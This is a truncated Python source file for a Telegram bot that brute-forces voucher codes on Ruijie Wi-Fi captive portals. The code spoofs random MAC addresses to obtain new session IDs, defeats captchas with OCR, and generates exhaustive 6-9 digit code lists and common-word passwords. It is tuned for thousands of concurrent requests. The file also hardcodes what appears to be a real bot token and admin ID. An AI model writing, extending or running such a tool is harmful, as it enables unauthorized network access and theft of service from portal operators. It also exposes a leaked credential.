#!/usr/bin/env python3
import re
import json
import base64
import random
import string
import time
import asyncio
import aiohttp
import cv2
import ddddocr
import numpy as np
import os
import gc
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ── CONFIGURATION ──────────────────────────────────────────────────────────
BOT_TOKEN = "8881920098:AAFx4k80OU37xvVKkr1qdK4lwo5XeBmDtwQ"  # <--- သင့် Bot Token
ADMIN_ID = 8674902951                                      # <--- Single Admin ID (သင့်အကောင့်)

BATCH_SIZE = 500        # Telegram Bot အတွက် သင့်တော်သော Batch Size
MAX_CONCURRENT = 3000     # သင့်တော်သော Concurrent Level
CONNECTION_LIMIT = 1500
TIMEOUT = 25

# ── GLOBALS ──────────────────────────────────────────────────────────────
_connector = None
_ocr = None
DIGITS = list(string.digits)
LOWERCASE_CHARS = list(string.ascii_lowercase)
MIXED_CHARS = list(string.ascii_lowercase + string.digits)

# User တစ်ယောက်ချင်းစီ၏ Scan State များကို မှတ်ထားရန် Dict
user_scans = {}

# ── OCR INITIALIZATION ───────────────────────────────────────────────────
def init_ocr():
    global _ocr
    if _ocr is None:
        _ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    try:
        init_ocr()
        nparr = np.frombuffer(image_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_GRAYSCALE)
        if img is None:
            return None
        _, buffer = cv2.imencode('.png', img)
        return _ocr.classification(buffer.tobytes()).upper()
    except Exception:
        return None

# ── HELPER FUNCTIONS ─────────────────────────────────────────────────────

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

def format_time(seconds):
    if seconds == float('inf') or seconds <= 0:
        return "N/A"
    if seconds > 86400:
        return f"{int(seconds/86400)}d {int((seconds%86400)/3600)}h"
    elif seconds > 3600:
        return f"{int(seconds/3600)}h {int((seconds%3600)/60)}m"
    elif seconds > 60:
        return f"{int(seconds/60)}m {int(seconds%60)}s"
    return f"{int(seconds)}s"

def get_mac():
    return ':'.join(f'{random.randint(0x00, 0xff):02x}' for _ in range(6))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

# ── GENERATORS ──────────────────────────────────────────────────────────

def iter_lowercase(length=6):
    chars = LOWERCASE_CHARS
    common = ['admin', 'guest', 'user', 'pass', 'test', 'login', 'root', 'wifi']
    for word in common:
        if len(word) <= length:
            padded = word.ljust(length, 'a')
            if len(padded) == length:
                yield padded
    while True:
        yield ''.join(random.choice(chars) for _ in range(length))

def iter_mixed(length=6):
    chars = MIXED_CHARS
    while True:
        yield ''.join(random.choice(chars) for _ in range(length))

def iter_digit_codes(mode, start_digit=None):
    if mode in ["6", "7", "8", "9"]:
        length = int(mode)
        if mode in ["6", "7"]:
            if start_digit is not None:
                start = int(start_digit) * (10 ** (length - 1))
                end = (int(start_digit) + 1) * (10 ** (length - 1))
                for i in range(start, end):
                    yield str(i).zfill(length)
                return
            else:
                codes = [str(i).zfill(length) for i in range(10 ** length)]
                random.shuffle(codes)
                yield from codes
                return
        if mode == "8":
            ranges = list(range(0, 100, 10))
            random.shuffle(ranges)
            for start_range in ranges:
                start = start_range * 1000000
                end = (start_range + 10) * 1000000
                chunk_codes = [str(i).zfill(8) for i in range(start, end)]
                random.shuffle(chunk_codes)
                yield from chunk_codes
                gc.collect()
        elif mode == "9":
            ranges = list(range(0, 1000, 10))
            random.shuffle(ranges)
            for start_range in ranges:
                start = start_range * 1000000
                end = (start_range + 10) * 1000000
                chunk_codes = [str(i).zfill(9) for i in range(start, end)]
                random.shuffle(chunk_codes)
                yield from chunk_codes
                gc.collect()

# ── CAPTCHA & RUIJIE API ─────────────────────────────────────────────────

async def get_session_id(session_obj, session_url, prev_sid=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'accept': 'text/html'}
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True, timeout=5) as req:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return sid.group(1
